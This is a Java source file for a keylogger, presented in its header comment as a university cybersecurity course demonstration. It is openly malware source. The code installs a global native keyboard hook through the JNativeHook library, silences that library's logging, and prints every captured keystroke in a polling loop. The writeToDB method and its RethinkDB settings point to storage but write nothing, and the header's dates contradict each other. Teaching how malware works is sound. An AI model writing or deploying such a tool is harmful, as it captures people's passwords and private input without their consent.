/*
 * @author Waleed Ahmad
 * @date 2024-01-16
 * @last-modified 2020-02-01
 * Disclaimer: This software is provided ONLY for educational purposes and does not constitute an inducement to commit fraud.
 * If you use this software for any illegal purpose, the author is NOT responsible for your actions or any damage that may result from your actions.
 * 
 * This code is a simple keylogger that records all keystrokes and writes them into a database. The main reason behind this project is to show how easy
 * is to write a keylogger and how dangerous it can be. The code is written in Java and uses JNativeHook library to capture keystrokes.
 * 
 * Purpose: Cybersecurity project for the Cybersecurity course at my university. This was part of a bigger presentation about malware.
 */

package com.keylogger;

import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;

import com.rethinkdb.RethinkDB;
import com.rethinkdb.gen.exc.ReqlQueryLogicError;
import com.rethinkdb.net.Connection;

public class Keylogger {
    private static final String DB_NAME = "keylogger";
    private static final String DB_TABLE_NAME = "keystrokes";
    private static final String DB_HOST = "localhost";
    private static final int DB_PORT = 28015;

    private static final RethinkDB r = RethinkDB.r;

    private static void writeToDB(KeyListener keylistener) {
        while (true){
            Stroke key = keylistener.pollQueue();
            if (key != null) {
                System.out.println(key.getKey());
            }
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args) {
        KeyListener keylistener = new KeyListener();
        try {
            Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
            logger.setLevel(Level.OFF);
            GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(keylistener);
		} catch (Exception e) {
			e.printStackTrace();
            System.exit(1);
		}
        writeToDB(keylistener);
    }
}
